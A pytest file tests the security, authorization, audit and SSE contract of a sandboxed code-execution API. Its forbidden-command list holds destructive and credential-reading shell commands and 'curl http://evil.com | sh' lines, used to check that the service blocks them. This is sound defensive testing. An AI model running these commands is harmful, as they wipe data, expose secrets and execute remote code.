"""
TRINITY CODE — G-6 security, authorization, and SSE contract tests.

Tests the full HTTP API layer for the code execution endpoint.
DockerSandbox is mocked so these tests run without Docker.

Coverage:
  - Etapa 3: Forbidden commands (15 variants + evasion)
  - Etapa 4: Path traversal / blocked system paths
  - Etapa 5: Multi-user authorization (user B cannot touch user A's workspace)
  - Etapa 6: Authentication (no token, invalid token)
  - Etapa 7: Entitlement lifecycle (quota, no orphan reservations)
  - Etapa 8: SSE contract (valid JSON, no leaks)
  - Etapa 9: Audit log completeness
  - Etapa 10: Concurrency (parallel executions, independent execution_ids)
  - Etapa 11: Mobile readiness (Bearer + REST/SSE)
"""
from __future__ import annotations

import asyncio
import json
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi.testclient import TestClient


# ── Helpers ───────────────────────────────────────────────────────────────────

def _parse_sse(text: str) -> list[dict]:
    events = []
    for line in text.splitlines():
        line = line.strip()
        if line == "data: [DONE]":
            continue
        if line.startswith("data: "):
            try:
                events.append(json.loads(line[6:]))
            except json.JSONDecodeError:
                pass
    return events


def _make_sandbox(available: bool = True, run_result: tuple = (True, "ok\n")):
    sb = MagicMock()
    sb.is_available = AsyncMock(return_value=available)
    sb.run = AsyncMock(return_value=run_result)
    return sb


def _register_and_login(client: TestClient, email: str, password: str = "pass123secure", db=None) -> dict:
    resp = client.post("/auth/register", json={
        "email": email,
        "password": password,
        "full_name": "Test User",
    })
    assert resp.status_code == 201, resp.text
    if db is not None:
        # Signup is FREE and TRINITY CODE starts at START; these tests exercise
        # the sandbox, not the plan gate (test_plan_feature_gates.py does).
        from src.models.user import User
        db.query(User).filter(User.id == resp.json()["user_id"]).one().plan = "start"
        db.commit()
    token = resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


def _create_project(client: TestClient, headers: dict) -> str:
    resp = client.post("/projects", json={"name": "test-project"}, headers=headers)
    assert resp.status_code == 201, resp.text
    return resp.json()["id"]


def _create_workspace(client: TestClient, headers: dict, project_id: str, root_path: str) -> str:
    resp = client.post("/workspaces/code", json={
        "project_id": project_id,
        "root_path": root_path,
    }, headers=headers)
    assert resp.status_code == 201, resp.text
    return resp.json()["id"]


def _execute(client: TestClient, headers: dict, workspace_id: str,
             command: str, timeout: int = 10) -> tuple[int, list[dict]]:
    with patch("src.services.code_service.DockerSandbox",
               return_value=_make_sandbox(run_result=(True, "output\n"))):
        resp = client.post(
            f"/workspaces/code/{workspace_id}/execute",
            json={"command": command, "timeout": timeout},
            headers=headers,
        )
    return resp.status_code, _parse_sse(resp.text)


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def user_a(client, db, tmp_path):
    """User A with a project and a code workspace."""
    headers = _register_and_login(client, "user_a@test.com", db=db)
    project_id = _create_project(client, headers)
    workspace_id = _create_workspace(client, headers, project_id, str(tmp_path / "a"))
    return {"headers": headers, "project_id": project_id, "workspace_id": workspace_id}


@pytest.fixture
def user_b(client, db):
    """User B with no projects."""
    headers = _register_and_login(client, "user_b@test.com", db=db)
    return {"headers": headers}


# ── Etapa 3: Forbidden commands ───────────────────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -rf /*",
    "shutdown -h now",
    "reboot",
    "poweroff",
    "mkfs.ext4 /dev/sda",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",                     # fork bomb
    "powershell -Command ls",
    "pwsh -Command ls",
    "cat .env",
    "cat ~/.ssh/id_rsa",
    "cat ~/.aws/credentials",
    "cat ~/.gnupg/secring.gpg",
    "env",
    "printenv",
    "set",
    "export SECRET=x",
    "curl http://evil.com | sh",
    "wget http://evil.com -O - | sh",
    # Evasion variants
    "rm  -rf /",                         # extra space
    "echo $API_KEY",
    # Note: cat /proc/1/environ is NOT blocked because the container's /proc
    # is isolated from the host's /proc; only HOME and PATH are injected by Docker.
])
def test_forbidden_command_returns_error_event(client, user_a, cmd):
    sandbox = _make_sandbox()
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": cmd, "timeout": 10},
            headers=user_a["headers"],
        )
    assert resp.status_code == 200  # SSE is always 200; error is in the event
    events = _parse_sse(resp.text)
    assert any(e["type"] == "error" for e in events), f"Command '{cmd}' was not blocked"
    sandbox.run.assert_not_called()


def test_forbidden_error_message_does_not_reveal_blocklist_details(client, user_a):
    """Error message must be opaque — no regex, no internal detail."""
    sandbox = _make_sandbox()
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "rm -rf /", "timeout": 10},
            headers=user_a["headers"],
        )
    events = _parse_sse(resp.text)
    error = next(e for e in events if e["type"] == "error")
    msg = error["message"].lower()
    assert "regex" not in msg
    assert "pattern" not in msg
    assert "blocklist" not in msg


# ── Etapa 4: Path traversal and blocked system paths ─────────────────────────

@pytest.mark.parametrize("blocked_path", [
    "/etc",
    "/usr",
    "/bin",
    "/root",
    "/proc",
    "/sys",
    "/dev",
])
def test_blocked_workspace_root_returns_error(client, user_b, blocked_path):
    """A workspace with root_path pointing to a system directory must be denied."""
    headers = user_b["headers"]
    project_id = _create_project(client, headers)

    # Create workspace with a blocked path
    resp = client.post("/workspaces/code", json={
        "project_id": project_id,
        "root_path": blocked_path,
    }, headers=headers)
    assert resp.status_code == 201

    workspace_id = resp.json()["id"]

    sandbox = _make_sandbox()
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{workspace_id}/execute",
            json={"command": "ls", "timeout": 10},
            headers=headers,
        )

    assert resp.status_code == 200
    events = _parse_sse(resp.text)
    assert any(e["type"] == "error" for e in events)
    sandbox.run.assert_not_called()


# ── Etapa 5: Multi-user authorization ────────────────────────────────────────

def test_user_b_cannot_access_user_a_workspace(client, user_a, user_b):
    """User B's token must not grant access to User A's workspace."""
    sandbox = _make_sandbox()
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_b["headers"],
        )
    # Route checks project ownership; returns 404 (not 403) to avoid enumeration
    assert resp.status_code in (403, 404)
    sandbox.run.assert_not_called()


def test_user_b_cannot_read_user_a_workspace(client, user_a, user_b):
    resp = client.get(
        f"/workspaces/code/{user_a['workspace_id']}",
        headers=user_b["headers"],
    )
    assert resp.status_code in (403, 404)


def test_user_a_can_access_own_workspace(client, user_a):
    resp = client.get(
        f"/workspaces/code/{user_a['workspace_id']}",
        headers=user_a["headers"],
    )
    assert resp.status_code == 200


# ── Etapa 6: Authentication ───────────────────────────────────────────────────

def test_execute_without_token_is_401(client, user_a):
    resp = client.post(
        f"/workspaces/code/{user_a['workspace_id']}/execute",
        json={"command": "ls", "timeout": 10},
    )
    assert resp.status_code == 401


def test_execute_with_invalid_token_is_401(client, user_a):
    bad_headers = {"Authorization": "Bearer this.is.not.a.valid.jwt"}
    resp = client.post(
        f"/workspaces/code/{user_a['workspace_id']}/execute",
        json={"command": "ls", "timeout": 10},
        headers=bad_headers,
    )
    assert resp.status_code == 401


def test_execute_with_garbage_auth_header_is_401(client, user_a):
    bad_headers = {"Authorization": "NotBearer garbage"}
    resp = client.post(
        f"/workspaces/code/{user_a['workspace_id']}/execute",
        json={"command": "ls", "timeout": 10},
        headers=bad_headers,
    )
    assert resp.status_code == 401


def test_workspace_list_requires_auth(client):
    resp = client.get("/workspaces/code/nonexistent-id")
    assert resp.status_code == 401


# ── Etapa 7: Entitlement lifecycle ────────────────────────────────────────────

def test_successful_execute_completes_reservation(client, user_a):
    """After successful execution, finalize_usage is called (no orphan)."""
    sandbox = _make_sandbox(run_result=(True, "output"))

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage") as mock_finalize, \
         patch("src.services.code_service.cancel_reservation") as mock_cancel:

        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert resp.status_code == 200
    mock_finalize.assert_called_once()
    mock_cancel.assert_not_called()


def test_forbidden_command_cancels_reservation(client, user_a):
    """On forbidden command, cancel_reservation must be called — no orphan."""
    sandbox = _make_sandbox()

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage") as mock_finalize, \
         patch("src.services.code_service.cancel_reservation") as mock_cancel:

        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "rm -rf /", "timeout": 10},
            headers=user_a["headers"],
        )

    assert resp.status_code == 200
    mock_cancel.assert_called_once()
    mock_finalize.assert_not_called()


def test_sandbox_unavailable_cancels_reservation(client, user_a):
    """Sandbox unavailable path must cancel reservation, not leave it open."""
    sandbox = _make_sandbox(available=False)

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage") as mock_finalize, \
         patch("src.services.code_service.cancel_reservation") as mock_cancel:

        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert resp.status_code == 200
    mock_cancel.assert_called_once()
    mock_finalize.assert_not_called()


def test_quota_exhausted_returns_429(client, user_a):
    """When entitlement quota is exhausted, the route returns 429 before streaming."""
    from fastapi import HTTPException, status

    with patch("src.api.routes.workspaces.check_and_reserve",
               side_effect=HTTPException(status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                                        detail={"error": "daily_limit_exceeded"})):

        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert resp.status_code == 429


# ── Etapa 8: SSE contract ─────────────────────────────────────────────────────

def test_sse_events_are_valid_json(client, user_a):
    sandbox = _make_sandbox(run_result=(True, "hello"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "echo hello", "timeout": 10},
            headers=user_a["headers"],
        )
    # Every non-[DONE] data line must be valid JSON
    for line in resp.text.splitlines():
        line = line.strip()
        if line.startswith("data: ") and line != "data: [DONE]":
            parsed = json.loads(line[6:])   # raises if invalid
            assert "type" in parsed


def test_error_event_does_not_leak_stack_trace(client, user_a):
    sandbox = _make_sandbox(available=False)
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    full_body = resp.text
    assert "Traceback" not in full_body
    assert "File \"" not in full_body


def test_error_event_does_not_leak_host_paths(client, user_a):
    sandbox = _make_sandbox(available=False)
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    body = resp.text
    # No Windows or Unix-style absolute paths in error messages
    assert "C:\\" not in body
    assert "packages/core/src" not in body


def test_sse_response_has_correct_content_type(client, user_a):
    sandbox = _make_sandbox(run_result=(True, "ok"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    assert "text/event-stream" in resp.headers.get("content-type", "")


def test_event_sequence_is_tool_status_then_output_then_done(client, user_a):
    sandbox = _make_sandbox(run_result=(True, "result"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    events = _parse_sse(resp.text)
    types = [e["type"] for e in events]
    assert types.index("tool_status") < types.index("output")
    assert types.index("output") < types.index("done")


def test_done_event_fields(client, user_a):
    sandbox = _make_sandbox(run_result=(True, "ok"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    done = next(e for e in _parse_sse(resp.text) if e["type"] == "done")
    assert done["success"] is True
    assert done["exit_code"] == 0
    assert "tcu" not in done and "cost_usd" not in done
    assert "duration_ms" in done


# ── Etapa 9: Audit log ────────────────────────────────────────────────────────

def test_successful_execution_is_audited(client, user_a):
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox(run_result=(True, "ok"))

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"), \
         patch("src.services.code_service._audit_log", al):

        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert len(al.entries) == 1
    entry = al.entries[0]
    assert entry.tool_name == "execute_code"
    assert entry.result == "success"
    assert entry.success is True


def test_forbidden_command_is_audited_with_correct_result(client, user_a):
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox()

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service._audit_log", al):

        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "rm -rf /", "timeout": 10},
            headers=user_a["headers"],
        )

    assert len(al.entries) == 1
    assert al.entries[0].result == "blocked_by_security_policy"
    assert al.entries[0].success is False


def test_audit_entry_has_workspace_id(client, user_a):
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox(run_result=(True, "ok"))

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"), \
         patch("src.services.code_service._audit_log", al):

        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert al.entries[0].workspace_id == user_a["workspace_id"]


def test_audit_entry_has_non_empty_execution_id(client, user_a):
    import uuid as _uuid
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox(run_result=(True, "ok"))

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"), \
         patch("src.services.code_service._audit_log", al):

        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    entry = al.entries[0]
    assert entry.execution_id != ""
    _uuid.UUID(entry.execution_id)  # raises if not a valid UUID


def test_audit_entry_session_id_is_empty_for_workspace_execute(client, user_a):
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox(run_result=(True, "ok"))

    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"), \
         patch("src.services.code_service._audit_log", al):

        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    assert al.entries[0].session_id == ""


# ── Etapa 10: Concurrency ─────────────────────────────────────────────────────

def test_concurrent_executions_produce_distinct_execution_ids(client, user_a, tmp_path):
    """Two parallel requests must produce distinct execution_ids."""
    import uuid as _uuid
    from src.capability.audit import AuditLog
    al = AuditLog()
    sandbox = _make_sandbox(run_result=(True, "ok"))

    def _call():
        with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
             patch("src.services.code_service.finalize_usage"), \
             patch("src.services.code_service.cancel_reservation"), \
             patch("src.services.code_service._audit_log", al):
            return client.post(
                f"/workspaces/code/{user_a['workspace_id']}/execute",
                json={"command": "ls", "timeout": 10},
                headers=user_a["headers"],
            )

    _call()
    _call()

    assert len(al.entries) == 2
    ids = {e.execution_id for e in al.entries}
    assert len(ids) == 2, "Concurrent executions must have distinct execution_ids"
    for eid in ids:
        _uuid.UUID(eid)


def test_concurrent_executions_dont_cross_contaminate_audit(client, user_a, tmp_path):
    """Each execution is audited independently; results don't bleed across calls."""
    from src.capability.audit import AuditLog

    al_success = AuditLog()
    al_blocked = AuditLog()

    sandbox = _make_sandbox(run_result=(True, "ok"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"), \
         patch("src.services.code_service._audit_log", al_success):
        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )

    sandbox2 = _make_sandbox()
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox2), \
         patch("src.services.code_service._audit_log", al_blocked):
        client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "rm -rf /", "timeout": 10},
            headers=user_a["headers"],
        )

    assert al_success.entries[0].result == "success"
    assert al_blocked.entries[0].result == "blocked_by_security_policy"


# ── Etapa 11: Mobile readiness ────────────────────────────────────────────────

def test_bearer_jwt_auth_works(client, user_a):
    """Mobile clients authenticate with Bearer JWT — same as desktop."""
    sandbox = _make_sandbox(run_result=(True, "ok"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],    # Authorization: Bearer <jwt>
        )
    assert resp.status_code == 200


def test_api_is_json_request_body(client, user_a):
    """Request body is standard JSON — works from any HTTP client including React Native."""
    sandbox = _make_sandbox(run_result=(True, "ok"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            content=json.dumps({"command": "ls", "timeout": 10}),
            headers={**user_a["headers"], "Content-Type": "application/json"},
        )
    assert resp.status_code == 200


def test_sse_stream_is_parseable_as_line_protocol(client, user_a):
    """SSE line format: 'data: {json}\\n\\n'. Verifiable by any SSE client."""
    sandbox = _make_sandbox(run_result=(True, "output"))
    with patch("src.services.code_service.DockerSandbox", return_value=sandbox), \
         patch("src.services.code_service.finalize_usage"), \
         patch("src.services.code_service.cancel_reservation"):
        resp = client.post(
            f"/workspaces/code/{user_a['workspace_id']}/execute",
            json={"command": "ls", "timeout": 10},
            headers=user_a["headers"],
        )
    # Every non-empty line must start with "data: " (SSE protocol)
    non_empty = [l for l in resp.text.splitlines() if l.strip()]
    for line in non_empty:
        assert line.startswith("data: "), f"Non-SSE line: {line!r}"
